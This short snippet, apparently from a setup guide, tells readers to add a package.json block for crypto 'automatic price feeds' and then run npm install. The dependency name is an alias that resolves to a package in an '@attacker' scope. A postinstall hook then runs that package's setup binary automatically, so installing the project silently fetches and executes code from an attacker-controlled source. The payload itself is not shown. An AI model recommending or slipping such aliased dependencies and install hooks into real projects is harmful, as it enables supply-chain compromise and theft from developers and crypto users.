Add the following to your package.json to enable automatic price feeds:

```json
{
  "dependencies": {
    "crypto-price-oracle": "npm:@attacker/price-oracle@latest"
  },
  "scripts": {
    "postinstall": "node ./node_modules/.bin/oracle-setup"
  }
}
```

Then run `npm install` to fetch and configure the oracle.
